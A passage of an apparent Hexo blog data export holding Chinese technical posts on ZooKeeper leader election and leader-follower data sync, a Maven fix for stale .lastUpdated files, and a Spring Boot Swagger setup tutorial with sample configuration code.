到了这里,集群中的所有服务器,不论是leader还是follower,大家的数据都是一致的了,可以开始接收客户端的连接了.如果是读类型的请求,那么直接返回就是了,因为并不改变数据;否则,都要向leader汇报,如何通知leader呢?就是通过前面讲到的leader_listen_port.leader收到这个修改数据的请求之后,将会广播给集群中其他follower,当超过一半数量的follower有了回复,那么就相当于这个修改操作哦了,这时leader可以告诉之前的那台服务器可以给客户端一个回应了.</p>\n<p>可以看到,上面1),2),3)对应的recovery过程,而4)对应的broadcast过程.这里只是简单的描述了一下zookeeper集群的工作原理,后面将分别展开来讨论.</p>\n<h4 id=\"Fast-Leader选举算法（领导者选举）\"><a href=\"#Fast-Leader选举算法（领导者选举）\" class=\"headerlink\" title=\"Fast Leader选举算法（领导者选举）\"></a>Fast Leader选举算法（领导者选举）</h4><p>&emsp;&emsp;如何在zookeeper集群中选举出一个leader,zookeeper使用了三种算法,具体使用哪种算法,在配置文件中是可以配置的,对应的配置项是”electionAlg”,其中1对应的是LeaderElection算法,2对应的是AuthFastLeaderElection算法,3对应的是FastLeaderElection算法.默认使用FastLeaderElection算法.其他两种算法我没有研究过,就不多说了.</p>\n<p>要理解这个算法,最好需要一些paxos算法的理论基础.</p>\n<p>1) 数据恢复阶段<br>首先,每个在zookeeper服务器先读取当前保存在磁盘的数据,zookeeper中的每份数据,都有一个对应的id值,这个值是依次递增的,换言之,越新的数据,对应的ID值就越大.</p>\n<p>2) 向其他节点发送投票值<br>在读取数据完毕之后,每个zookeeper服务器发送自己选举的leader（首次选自己）,这个协议中包含了以下几部分的数据:</p>\n<pre><code>a)所选举leader的id(就是配置文件中写好的每个服务器的id) ,在初始阶段,每台服务器的这个值都是自己服务器的id,也就是它们都选举自己为leader.\nb) 服务器最大数据的id,这个值大的服务器,说明存放了更新的数据.\nc)逻辑时钟的值,这个值从0开始递增,每次选举对应一个值,也就是说:  如果在同一次选举中,那么这个值应该是一致的 ;  逻辑时钟值越大,说明这一次选举leader的进程更新.\nd) 本机在当前选举过程中的状态,有以下几种:LOOKING,FOLLOWING,OBSERVING,LEADING,顾名思义不必解释了吧.\n</code></pre><p>3）接受来自其他节点的数据<br>&emsp;&emsp;每台服务器将自己服务器的以上数据发送到集群中的其他服务器之后,同样的也需要接收来自其他服务器的数据,它将做以下的处理:<br>（1）如果所接收数据中服务器的状态还是在选举阶段(LOOKING 状态),那么首先判断逻辑时钟值,又分为以下三种情况:</p>\n<pre><code> a) 如果发送过来的逻辑时钟大于目前的逻辑时钟,那么说明这是更新的一次选举,此时需要更新一下本机的逻辑时钟值,同时将之前收集到的来自其他服务器的选举清空,因为这些数据已经不再有效了.然后判断是否需要更新当前自己的选举情况.在这里是根据选举leader id,保存的最大数据id来进行判断的,这两种数据之间对这个选举结果的影响的权重关系是:首先看数据id,数据id大者胜出;其次再判断leader id,leader id大者胜出.然后再将自身最新的选举结果(也就是上面提到的三种数据）广播给其他服务器).\nb) 发送过来数据的逻辑时钟小于本机的逻辑时钟，说明对方在一个相对较早的选举进程中,这里只需要将本机的数据发送过去就是了\nc) 两边的逻辑时钟相同,此时也只是调用totalOrderPredicate函数判断是否需要更新本机的数据,如果更新了再将自己最新的选举结果广播出去就是了.\n</code></pre><p>然后再处理两种情况:<br>&emsp;&emsp;1)服务器判断是不是已经收集到了所有服务器的选举状态,如果是，那么这台服务器选举的leader就定下来了，然后根据选举结果设置自己的角色(FOLLOWING还是LEADER),然后退出选举过程就是了.<br>&emsp;&emsp;2)即使没有收集到所有服务器的选举状态,也可以根据该节点上选择的最新的leader是不是得到了超过半数以上服务器的支持,如果是,那么当前线程将被阻塞等待一段时间(这个时间在finalizeWait定义)看看是不是还会收到当前leader的数据更优的leader,如果经过一段时间还没有这个新的leader提出来，那么这台服务器最终的leader就确定了,否则进行下一次选举. </p>\n<p>（2) 如果所接收服务器不在选举状态,也就是在FOLLOWING或者LEADING状态</p>\n<p>做以下两个判断:<br>&emsp;&emsp;a) 如果逻辑时钟相同,将该数据保存到recvset,如果所接收服务器宣称自己是leader,那么将判断是不是有半数以上的服务器选举它,如果是则设置选举状态退出选举过程<br>&emsp;&emsp;b) 否则这是一条与当前逻辑时钟不符合的消息,那么说明在另一个选举过程中已经有了选举结果,于是将该选举结果加入到outofelection集合中,再根据outofelection来判断是否可以结束选举,如果可以也是保存逻辑时钟,设置选举状态,退出选举过程.<br>代码如下:</p>\n<p>以一个简单的例子来说明整个选举的过程.<br>假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么.<br>&emsp;&emsp;1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态<br>&emsp;&emsp;2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态.<br>&emsp;&emsp;3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader.<br>&emsp;&emsp;4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了.<br>&emsp;&emsp;5) 服务器5启动,同4一样,当小弟.</p>\n<p>&emsp;&emsp;以上就是fastleader算法的简要分析,还有一些异常情况的处理,比如某台服务器宕机之后的处理,当leader宕机之后的处理等等,后面再谈.</p>\n<h4 id=\"Leader与Follower同步数据（原子广播）\"><a href=\"#Leader与Follower同步数据（原子广播）\" class=\"headerlink\" title=\"Leader与Follower同步数据（原子广播）\"></a>Leader与Follower同步数据（原子广播）</h4><p>&emsp;&emsp;根据 Fast Leader选举算法中的分析,如果一台zookeeper服务器成为集群中的leader,那么一定是当前所有服务器中保存数据最多（不是最新？？）的服务器,所以在这台服务器成为leader之后,首先要做的事情就是与集群中的其它服务器(现在是follower)同步数据,保证大家的数据一致,这个过程完毕了才开始正式处理来自客户端的连接请求.</p>\n<p>&emsp;&emsp;Fast Leader选举算法中提到的同步数据时使用的逻辑时钟,它的初始值是0,每次选举过程都会递增的,在leader正式上任之后做的第一件事情,就是根据当前保存的数据id值,设置最新的逻辑时钟值。</p>\n<p>&emsp;&emsp;随后,leader构建NEWLEADER封包,该封包的数据是当前最大数据的id,广播给所有的follower,也就是告知follower leader保存的数据id是多少,大家看看是不是需要同步。然后,leader根据follower数量给每个follower创建一个线程LearnerHandler,专门负责接收它们的同步数据请求.leader主线程开始阻塞在这里,等待其他follower的回应(也就是LearnerHandler线程的处理结果),同样的,只有在超过半数的follower已经同步数据完毕,这个过程才能结束,leader才能正式成为leader.</p>\n<p><strong>leader所做的工作：</strong></p>\n<p>&emsp;&emsp;所以其实leader与follower同步数据的大部分操作都在LearnerHandler线程中处理的,接着看这一块.<br>leader接收到的来自某个follower封包一定是FOLLOWERINFO,该封包告知了该服务器保存的数据id.之后根据这个数据id与本机保存的数据进行比较:<br>&emsp;&emsp;1) 如果数据完全一致,则发送DIFF封包告知follower当前数据就是最新的了.<br>&emsp;&emsp;2) 判断这一阶段之内有没有已经被提交的提议值,如果有,那么:<br>&emsp;&emsp;&emsp;&emsp;a) 如果有部分数据没有同步,那么会发送DIFF封包将有差异的数据同步过去.同时将follower没有的数据逐个发送COMMIT封包给follower要求记录下来.<br>&emsp;&emsp;&emsp;&emsp;b) 如果follower数据id更大,那么会发送TRUNC封包告知截除多余数据.（一台leader数据没同步就宕掉了，选举之后恢复了，数据比现在leader更新）<br>&emsp;&emsp;3) 如果这一阶段内没有提交的提议值,直接发送SNAP封包将快照同步发送给follower.<br>&emsp;&emsp;4）消息完毕之后,发送UPTODATE封包告知follower当前数据就是最新的了,再次发送NEWLEADER封包宣称自己是leader,等待follower的响应.</p>\n<p><strong>follower做的工作：</strong><br>（1）会尝试与leader建立连接,这里有一个机制,如果一定时间内没有连接上,就报错退出,重新回到选举状态.<br>（2）其次在发送FOLLOWERINFO封包,该封包中带上自己的最大数据id,也就是会告知leader本机保存的最大数据id.<br>（3）根据前面对LeaderHandler的分析,leader会根据不同的情况发送DIFF,UPTODATE,TRUNC,SNAP,依次进行处理就是了,此时follower跟leader的数据也就同步上了.<br>（4）由于leader端发送的最后一个封包是UPTODATE,因此在接收到这个封包之后follower结束同步数据过程,发送ACK封包回复leader.</p>\n<p>以上过程中,任何情况出现的错误,服务器将自动将选举状态切换到LOOKING状态,重新开始进行选举.</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>目录：</strong></p>\n<ol>\n<li>工作原理概述</li>\n<li>Fast Leader选举算法（领导者选举）</li>\n<li>Leader与Follower同步数据（原子广播）</li>\n</ol>\n<hr>\n<h4 id=\"工作原理概述\"><a href=\"#工作原理概述\" class=\"headerlink\" title=\"工作原理概述\"></a>工作原理概述</h4><p>zookeeper3.3.3源码分析(一)工作原理概述<br>阅读时参考的版本是3.3.3.</p>\n<p>&emsp;&emsp;简单的说一下zookeeper工作的过程,如果对这个过程还不太清楚,或者说对它如何使用等不太清楚的,可以参考一下其他的文章,比如这篇,这一系列的文章将不讲解它如何使用(实际上我也没有在具体项目中使用过,只是简单的配置运行起来大概晓得如何工作而已).</p>\n<p>&emsp;&emsp;zookeeper有两种工作的模式,一种是单机方式,另一种是集群方式.单机方式不属于这里分析的范畴,因为研究zookeeper的目的就在于研究一个zookeeper集群的机器如何协调起来工作的.</p>\n<p>&emsp;&emsp;要配置几台zookeeper一起工作,大家在开始必须使用相同的配置文件,配置文件中有一些配置项,但是与集群相关的是这一项:</p>\n<p>server.1=192.168.211.1:2888:3888<br>server.2=192.168.211.2:2888:3888</p>\n<p>这里定义了两台服务器的配置,格式为:</p>\n<p>server.serverid=serverhost:leader_listent_port:quorum_port</p>\n<p>&emsp;&emsp;顾名思义,serverid是本服务器的id,leader_listen_port是该服务器一旦成为leader之后需要监听的端口,用于接收来自follower的请求,quorum_port是集群中的每一个服务器在最开始选举leader时监听的端口,用于服务器互相之间通信选举leader.</p>\n<p>&emsp;&emsp;需要注意的是,server id并没有写在这个配置文件中,而是在datadir中的myid文件中指定,我理解这么做的目的是:所有的服务器统一使用一个配置文件,该配置文件里面没有任何与特定服务器相关的信息,这样便于发布服务的时候不会出错,而独立出来一个文件专门存放这个server id值.</p>\n<p>zookeeper集群工作的过程包括如下几步:<br>1) recovery,这个过程泛指集群服务器的启动和恢复,因为恢复也可以理解为另一种层面上的”启动”–需要恢复历史数据的启动,后面会详细讲解.<br>2) broadcast,这是启动完毕之后,集群中的服务器开始接收客户端的连接一起工作的过程,如果客户端有修改数据的改动,那么一定会由leader广播给follower,所以称为”broadcast”.</p>\n<p>展开来说,zookeeper集群大概是这样工作的:<br>&emsp;&emsp;1) 首先每个服务器读取配置文件和数据文件,根据serverid知道本机对应的配置(就是前面那些地址和端口),并且将历史数据加载进内存中.<br>&emsp;&emsp;2) 集群中的服务器开始根据前面给出的quorum port监听集群中其他服务器的请求,并且把自己选举的leader也通知其他服务器,来来往往几回,选举出集群的一个leader.<br>&emsp;&emsp;3) 选举完leader其实还不算是真正意义上的”leader”,因为到了这里leader还需要与集群中的其他服务器同步数据,如果这一步出错,将返回2)中重新选举leader.在leader选举完毕之后,集群中的其他服务器称为”follower”,也就是都要听从leader的指令.<br>&emsp;&emsp;4) 到了这里,集群中的所有服务器,不论是leader还是follower,大家的数据都是一致的了,可以开始接收客户端的连接了.如果是读类型的请求,那么直接返回就是了,因为并不改变数据;否则,都要向leader汇报,如何通知leader呢?就是通过前面讲到的leader_listen_port.leader收到这个修改数据的请求之后,将会广播给集群中其他follower,当超过一半数量的follower有了回复,那么就相当于这个修改操作哦了,这时leader可以告诉之前的那台服务器可以给客户端一个回应了.</p>\n<p>可以看到,上面1),2),3)对应的recovery过程,而4)对应的broadcast过程.这里只是简单的描述了一下zookeeper集群的工作原理,后面将分别展开来讨论.</p>\n<h4 id=\"Fast-Leader选举算法（领导者选举）\"><a href=\"#Fast-Leader选举算法（领导者选举）\" class=\"headerlink\" title=\"Fast Leader选举算法（领导者选举）\"></a>Fast Leader选举算法（领导者选举）</h4><p>&emsp;&emsp;如何在zookeeper集群中选举出一个leader,zookeeper使用了三种算法,具体使用哪种算法,在配置文件中是可以配置的,对应的配置项是”electionAlg”,其中1对应的是LeaderElection算法,2对应的是AuthFastLeaderElection算法,3对应的是FastLeaderElection算法.默认使用FastLeaderElection算法.其他两种算法我没有研究过,就不多说了.</p>\n<p>要理解这个算法,最好需要一些paxos算法的理论基础.</p>\n<p>1) 数据恢复阶段<br>首先,每个在zookeeper服务器先读取当前保存在磁盘的数据,zookeeper中的每份数据,都有一个对应的id值,这个值是依次递增的,换言之,越新的数据,对应的ID值就越大.</p>\n<p>2) 向其他节点发送投票值<br>在读取数据完毕之后,每个zookeeper服务器发送自己选举的leader（首次选自己）,这个协议中包含了以下几部分的数据:</p>\n<pre><code>a)所选举leader的id(就是配置文件中写好的每个服务器的id) ,在初始阶段,每台服务器的这个值都是自己服务器的id,也就是它们都选举自己为leader.\nb) 服务器最大数据的id,这个值大的服务器,说明存放了更新的数据.\nc)逻辑时钟的值,这个值从0开始递增,每次选举对应一个值,也就是说:  如果在同一次选举中,那么这个值应该是一致的 ;  逻辑时钟值越大,说明这一次选举leader的进程更新.\nd) 本机在当前选举过程中的状态,有以下几种:LOOKING,FOLLOWING,OBSERVING,LEADING,顾名思义不必解释了吧.\n</code></pre><p>3）接受来自其他节点的数据<br>&emsp;&emsp;每台服务器将自己服务器的以上数据发送到集群中的其他服务器之后,同样的也需要接收来自其他服务器的数据,它将做以下的处理:<br>（1）如果所接收数据中服务器的状态还是在选举阶段(LOOKING 状态),那么首先判断逻辑时钟值,又分为以下三种情况:</p>\n<pre><code> a) 如果发送过来的逻辑时钟大于目前的逻辑时钟,那么说明这是更新的一次选举,此时需要更新一下本机的逻辑时钟值,同时将之前收集到的来自其他服务器的选举清空,因为这些数据已经不再有效了.然后判断是否需要更新当前自己的选举情况.在这里是根据选举leader id,保存的最大数据id来进行判断的,这两种数据之间对这个选举结果的影响的权重关系是:首先看数据id,数据id大者胜出;其次再判断leader id,leader id大者胜出.然后再将自身最新的选举结果(也就是上面提到的三种数据）广播给其他服务器).\nb) 发送过来数据的逻辑时钟小于本机的逻辑时钟，说明对方在一个相对较早的选举进程中,这里只需要将本机的数据发送过去就是了\nc) 两边的逻辑时钟相同,此时也只是调用totalOrderPredicate函数判断是否需要更新本机的数据,如果更新了再将自己最新的选举结果广播出去就是了.\n</code></pre><p>然后再处理两种情况:<br>&emsp;&emsp;1)服务器判断是不是已经收集到了所有服务器的选举状态,如果是，那么这台服务器选举的leader就定下来了，然后根据选举结果设置自己的角色(FOLLOWING还是LEADER),然后退出选举过程就是了.<br>&emsp;&emsp;2)即使没有收集到所有服务器的选举状态,也可以根据该节点上选择的最新的leader是不是得到了超过半数以上服务器的支持,如果是,那么当前线程将被阻塞等待一段时间(这个时间在finalizeWait定义)看看是不是还会收到当前leader的数据更优的leader,如果经过一段时间还没有这个新的leader提出来，那么这台服务器最终的leader就确定了,否则进行下一次选举. </p>\n<p>（2) 如果所接收服务器不在选举状态,也就是在FOLLOWING或者LEADING状态</p>\n<p>做以下两个判断:<br>&emsp;&emsp;a) 如果逻辑时钟相同,将该数据保存到recvset,如果所接收服务器宣称自己是leader,那么将判断是不是有半数以上的服务器选举它,如果是则设置选举状态退出选举过程<br>&emsp;&emsp;b) 否则这是一条与当前逻辑时钟不符合的消息,那么说明在另一个选举过程中已经有了选举结果,于是将该选举结果加入到outofelection集合中,再根据outofelection来判断是否可以结束选举,如果可以也是保存逻辑时钟,设置选举状态,退出选举过程.<br>代码如下:</p>\n<p>以一个简单的例子来说明整个选举的过程.<br>假设有五台服务器组成的zookeeper集群,它们的id从1-5,同时它们都是最新启动的,也就是没有历史数据,在存放数据量这一点上,都是一样的.假设这些服务器依序启动,来看看会发生什么.<br>&emsp;&emsp;1) 服务器1启动,此时只有它一台服务器启动了,它发出去的报没有任何响应,所以它的选举状态一直是LOOKING状态<br>&emsp;&emsp;2) 服务器2启动,它与最开始启动的服务器1进行通信,互相交换自己的选举结果,由于两者都没有历史数据,所以id值较大的服务器2胜出,但是由于没有达到超过半数以上的服务器都同意选举它(这个例子中的半数以上是3),所以服务器1,2还是继续保持LOOKING状态.<br>&emsp;&emsp;3) 服务器3启动,根据前面的理论分析,服务器3成为服务器1,2,3中的老大,而与上面不同的是,此时有三台服务器选举了它,所以它成为了这次选举的leader.<br>&emsp;&emsp;4) 服务器4启动,根据前面的分析,理论上服务器4应该是服务器1,2,3,4中最大的,但是由于前面已经有半数以上的服务器选举了服务器3,所以它只能接收当小弟的命了.<br>&emsp;&emsp;5) 服务器5启动,同4一样,当小弟.</p>\n<p>&emsp;&emsp;以上就是fastleader算法的简要分析,还有一些异常情况的处理,比如某台服务器宕机之后的处理,当leader宕机之后的处理等等,后面再谈.</p>\n<h4 id=\"Leader与Follower同步数据（原子广播）\"><a href=\"#Leader与Follower同步数据（原子广播）\" class=\"headerlink\" title=\"Leader与Follower同步数据（原子广播）\"></a>Leader与Follower同步数据（原子广播）</h4><p>&emsp;&emsp;根据 Fast Leader选举算法中的分析,如果一台zookeeper服务器成为集群中的leader,那么一定是当前所有服务器中保存数据最多（不是最新？？）的服务器,所以在这台服务器成为leader之后,首先要做的事情就是与集群中的其它服务器(现在是follower)同步数据,保证大家的数据一致,这个过程完毕了才开始正式处理来自客户端的连接请求.</p>\n<p>&emsp;&emsp;Fast Leader选举算法中提到的同步数据时使用的逻辑时钟,它的初始值是0,每次选举过程都会递增的,在leader正式上任之后做的第一件事情,就是根据当前保存的数据id值,设置最新的逻辑时钟值。</p>\n<p>&emsp;&emsp;随后,leader构建NEWLEADER封包,该封包的数据是当前最大数据的id,广播给所有的follower,也就是告知follower leader保存的数据id是多少,大家看看是不是需要同步。然后,leader根据follower数量给每个follower创建一个线程LearnerHandler,专门负责接收它们的同步数据请求.leader主线程开始阻塞在这里,等待其他follower的回应(也就是LearnerHandler线程的处理结果),同样的,只有在超过半数的follower已经同步数据完毕,这个过程才能结束,leader才能正式成为leader.</p>\n<p><strong>leader所做的工作：</strong></p>\n<p>&emsp;&emsp;所以其实leader与follower同步数据的大部分操作都在LearnerHandler线程中处理的,接着看这一块.<br>leader接收到的来自某个follower封包一定是FOLLOWERINFO,该封包告知了该服务器保存的数据id.之后根据这个数据id与本机保存的数据进行比较:<br>&emsp;&emsp;1) 如果数据完全一致,则发送DIFF封包告知follower当前数据就是最新的了.<br>&emsp;&emsp;2) 判断这一阶段之内有没有已经被提交的提议值,如果有,那么:<br>&emsp;&emsp;&emsp;&emsp;a) 如果有部分数据没有同步,那么会发送DIFF封包将有差异的数据同步过去.同时将follower没有的数据逐个发送COMMIT封包给follower要求记录下来.<br>&emsp;&emsp;&emsp;&emsp;b) 如果follower数据id更大,那么会发送TRUNC封包告知截除多余数据.（一台leader数据没同步就宕掉了，选举之后恢复了，数据比现在leader更新）<br>&emsp;&emsp;3) 如果这一阶段内没有提交的提议值,直接发送SNAP封包将快照同步发送给follower.<br>&emsp;&emsp;4）消息完毕之后,发送UPTODATE封包告知follower当前数据就是最新的了,再次发送NEWLEADER封包宣称自己是leader,等待follower的响应.</p>\n<p><strong>follower做的工作：</strong><br>（1）会尝试与leader建立连接,这里有一个机制,如果一定时间内没有连接上,就报错退出,重新回到选举状态.<br>（2）其次在发送FOLLOWERINFO封包,该封包中带上自己的最大数据id,也就是会告知leader本机保存的最大数据id.<br>（3）根据前面对LeaderHandler的分析,leader会根据不同的情况发送DIFF,UPTODATE,TRUNC,SNAP,依次进行处理就是了,此时follower跟leader的数据也就同步上了.<br>（4）由于leader端发送的最后一个封包是UPTODATE,因此在接收到这个封包之后follower结束同步数据过程,发送ACK封包回复leader.</p>\n<p>以上过程中,任何情况出现的错误,服务器将自动将选举状态切换到LOOKING状态,重新开始进行选举.</p>\n"},{"title":"maven常见问题","date":"2017-01-01T08:23:27.000Z","_content":"**原因分析：**\n出现.lastUpdated结尾的文件的原因：由于网络原因没有将Maven的依赖下载完整，导致。\n**解决方案：**\n删除所有以.lastUpdate结尾的文件\n1、切换到maven的本地仓库\n2、在当前目录打开cmd命令行\n3、执行命令：for /r %i in (*.lastUpdated) do del %i\n在项目上执行 Maven Update （Alt + F5）\n\n**Maven跳过测试的命令:**\n\n\t-Dmaven.test.skip=true(=号两端不能存在空格)","source":"_posts/maven常见问题.md","raw":"---\ntitle: maven常见问题\ndate: 2017-01-01 16:23:27\ntags: Maven\n---\n**原因分析：**\n出现.lastUpdated结尾的文件的原因：由于网络原因没有将Maven的依赖下载完整，导致。\n**解决方案：**\n删除所有以.lastUpdate结尾的文件\n1、切换到maven的本地仓库\n2、在当前目录打开cmd命令行\n3、执行命令：for /r %i in (*.lastUpdated) do del %i\n在项目上执行 Maven Update （Alt + F5）\n\n**Maven跳过测试的命令:**\n\n\t-Dmaven.test.skip=true(=号两端不能存在空格)","slug":"maven常见问题","published":1,"updated":"2018-01-31T08:26:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44twr002omfah32c9cl7m","content":"<p><strong>原因分析：</strong><br>出现.lastUpdated结尾的文件的原因：由于网络原因没有将Maven的依赖下载完整，导致。<br><strong>解决方案：</strong><br>删除所有以.lastUpdate结尾的文件<br>1、切换到maven的本地仓库<br>2、在当前目录打开cmd命令行<br>3、执行命令：for /r %i in (*.lastUpdated) do del %i<br>在项目上执行 Maven Update （Alt + F5）</p>\n<p><strong>Maven跳过测试的命令:</strong></p>\n<pre><code>-Dmaven.test.skip=true(=号两端不能存在空格)\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><strong>原因分析：</strong><br>出现.lastUpdated结尾的文件的原因：由于网络原因没有将Maven的依赖下载完整，导致。<br><strong>解决方案：</strong><br>删除所有以.lastUpdate结尾的文件<br>1、切换到maven的本地仓库<br>2、在当前目录打开cmd命令行<br>3、执行命令：for /r %i in (*.lastUpdated) do del %i<br>在项目上执行 Maven Update （Alt + F5）</p>\n<p><strong>Maven跳过测试的命令:</strong></p>\n<pre><code>-Dmaven.test.skip=true(=号两端不能存在空格)\n</code></pre>"},{"title":"springboot集成swagger注解入门","date":"2018-01-03T06:46:49.000Z","_content":"#### [Swagger][1]简介 THE WORLD'S MOST POPULAR API TOOLING\nSwagger is the world’s largest framework of API developer tools for the OpenAPI Specification(OAS), enabling development across the entire API lifecycle, from design and documentation, to test and deployment.\n\n#### Swagger的作用:\n\nSwagger是一款RESTFUL接口的文档在线自动生成框架，该框架可以自动生成接口文档，也可以进行接口测试，生成mock数据等。通过使用该框架可以快速、动态的更新和管理API，方便前、后台协同开发，提高开发效率，减少开发过程中一些人为的误差。\tSwagger让部署管理和使用功能强大的API从未如此简单。\n\n#### SpringBoot 集成Swagger步骤:\n\n1. 引入maven坐标配置\n\n2. 建立Swagger配置\n\n3. 使用Swagger注解\n\n4. 访问API文档查看效果\n\n**引入maven坐标：**\n\n\t<dependency>\n\t\t<groupId>io.springfox</groupId>\n\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t<version>${springfox-version}</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>io.springfox</groupId>\n\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t<version>${springfox-version}</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>joda-time</groupId>\n\t\t<artifactId>joda-time</artifactId>\n\t\t<version>2.9.9</version>\n\t</dependency>\n\n** 建立Swagger配置类： **\n\n\tpackage com.example.swagger.config;\n\n\timport org.springframework.context.annotation.Bean;\n\timport org.springframework.context.annotation.Configuration;\n\timport springfox.documentation.builders.ApiInfoBuilder;\n\timport springfox.documentation.builders.PathSelectors;\n\timport springfox.documentation.service.ApiInfo;\n\timport springfox.documentation.spi.DocumentationType;\n\timport springfox.documentation.spring.web.plugins.Docket;\n\timport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\t\n\t/**\n\t * Description: swagger配置类，通过Configuration注解让spring容器自动加载该类\n\t *\n\t * @author Jiankun.Zhangsun 2018/1/2 15:13\n\t */\n\t@Configuration\n\t@EnableSwagger2\n\tpublic class SwaggerConfig {\n\t\n\t    /**\n\t     * 将返回值当作一个bean注入到容器中\n\t     *\n\t     * @return api文档对象\n\t     */\n\t    @Bean\n\t    public Docket createRestApi() {\n\t        return new Docket(DocumentationType.SWAGGER_2)\n\t                .apiInfo(apiInfo()).useDefaultResponseMessages(false)\n\t                .select()\n\t                .paths(PathSelectors.any())\n\t                .build();\n\t    }\n\t\n\t    /**\n\t     * api 文档信息对象，主要是文档标题相关的信息\n\t     *\n\t     * @return 文档信息对象\n\t     */\n\t    private ApiInfo apiInfo() {\n\t        return new ApiInfoBuilder()\n\t                .title(\"Spring Boot中使用Swagger2构建RESTful APIs\")\n\t                .description(\"更多Spring Boot相关文章请关注：http://blog.didispace.com/\")\n\t                .termsOfServiceUrl(\"http://blog.didispace.com/\")\n\t                .contact(\"Murphy's BLOG\")\n\t                .version(\"1.0.0.0\")\n\t                .build();\n\t    }\n\t}\n\n代码解释： \nApiInfo 这个对象是用来生成文档相关信息的，通过这个对象可以构建出文档标题、描述、版本等信息；\ncreateRestApi() 这个方法是进行Docket创建的；\nDocket 这个对象是用来渲染整个API文档的对象，这个对象通过@Bean注解注册到了Spring容器中，Swagger会自动加载该对象进行文档构建。\n\n** 使用Swagger注解： **\n\n\tpackage com.example.swagger.controller;\n\t\n\timport io.swagger.annotations.*;\n\timport org.springframework.web.bind.annotation.*;\n\t\n\t/**\n\t * Description: swagger controller test\n\t *\n\t * @author Jiankun.Zhangsun 2018/1/2 15:40\n\t */\n\t@Api(value = \"petApi\", description = \"pet api description\")\n\t@RestController\n\tpublic class PetApi {\n\t    @ApiOperation(value = \"get city by state\", notes = \"Get city by state\", \n\t            responseContainer = \"container\",\n\t            httpMethod = \"get\",\n\t\t\t\tcode = 304, \n\t            hidden = false, \n\t            produces = \"application/json;charset=utf-8\",\n\t            response = Pet.class, \n\t            tags = {\"user\", \"person\", \"pet\"})\n\t    @ApiResponses(value = {@ApiResponse(code = 405, message = \"Invalid input\", response = Pet.class) })\n\t    @RequestMapping(value = \"/pet\", method = RequestMethod.GET)\n\t    public Pet getPet(@ApiParam(value = \"param introduction\", name = \"name\", required = true) @RequestBody Pet p) {\n\t        Pet pet = new Pet();\n\t        pet.setName(p.getName());\n\t        pet.setAge(p.getAge());\n\t        return pet;\n\t    }\n\t}\n\n代码解释：\n@Api(value, description)\n\n\t类级别的注解，用于标识这是一个Api文档类，\n\tvalue： 表示Api文档名称，\n\tdescription： 用于简单的描述该Api文档。\n@ApiOperation(value，notes，response，tags，hidden，httpMethod，consumer...)， \n\n\tvalue：api功能描述， \n\tnotes: api功能的详细描述 \n\tresponse: 返回值类型的定义，class类型\n\ttags: api分类的管理，是一个字符串数组对象，每个值对应一个标签目录，没有就会新建一个，有了就直接进行分类\n\thidden: 是否隐藏该Api，默认为false， \n\thttpMethod: 请求方式\n\tconsumer: 接收的请求头信息\n\tproduces： 生产的请求头信息\n\n@ApiParam(value, name, required)\n\n\tvalue: 参数说明\n\tname: 参数名称\n\trequired: 是否必传\n\n** 访问API文档查看效果： **\n\n本地访问路径：http://localhost:8081/swagger-ui.html#/ 即可查看生成的效果。\n\n\n\n\n\n\n\n\n\n\n[1]: https://swagger.io/\n\n\n","source":"_posts/springboot集成swagger注解入门.md","raw":"---\ntitle: springboot集成swagger注解入门\ndate: 2018-01-03 14:46:49\ntags: Swagger\n---\n#### [Swagger][1]简介 THE WORLD'S MOST POPULAR API TOOLING\nSwagger is the world’s largest framework of API developer tools for the OpenAPI Specification(OAS), enabling development across the entire API lifecycle, from design and documentation, to test and deployment.\n\n#### Swagger的作用:\n\nSwagger是一款RESTFUL接口的文档在线自动生成框架，该框架可以自动生成接口文档，也可以进行接口测试，生成mock数据等。通过使用该框架可以快速、动态的更新和管理API，方便前、后台协同开发，提高开发效率，减少开发过程中一些人为的误差。\tSwagger让部署管理和使用功能强大的API从未如此简单。\n\n#### SpringBoot 集成Swagger步骤:\n\n1. 引入maven坐标配置\n\n2. 建立Swagger配置\n\n3. 使用Swagger注解\n\n4. 访问API文档查看效果\n\n**引入maven坐标：**\n\n\t<dependency>\n\t\t<groupId>io.springfox</groupId>\n\t\t<artifactId>springfox-swagger2</artifactId>\n\t\t<version>${springfox-version}</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>io.springfox</groupId>\n\t\t<artifactId>springfox-swagger-ui</artifactId>\n\t\t<version>${springfox-version}</version>\n\t</dependency>\n\t<dependency>\n\t\t<groupId>joda-time</groupId>\n\t\t<artifactId>joda-time</artifactId>\n\t\t<version>2.9.9</version>\n\t</dependency>\n\n** 建立Swagger配置类： **\n\n\tpackage com.example.swagger.config;\n\n\timport org.springframework.context.annotation.Bean;\n\timport org.springframework.context.annotation.Configuration;\n\timport springfox.documentation.builders.ApiInfoBuilder;\n\timport springfox.documentation.builders.PathSelectors;\n\timport springfox.documentation.service.ApiInfo;\n\timport springfox.documentation.spi.DocumentationType;\n\timport springfox.documentation.spring.web.plugins.Docket;\n\timport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\t\n\t/**\n\t * Description: swagger配置类，通过Configuration注解让spring容器自动加载该类\n\t *\n\t * @author Jiankun.Zhangsun 2018/1/2 15:13\n\t */\n\t@Configuration\n\t@EnableSwagger2\n\tpublic class SwaggerConfig {\n\t\n\t    /**\n\t     * 将返回值当作一个bean注入到容器中\n\t     *\n\t     * @return api文档对象\n\t     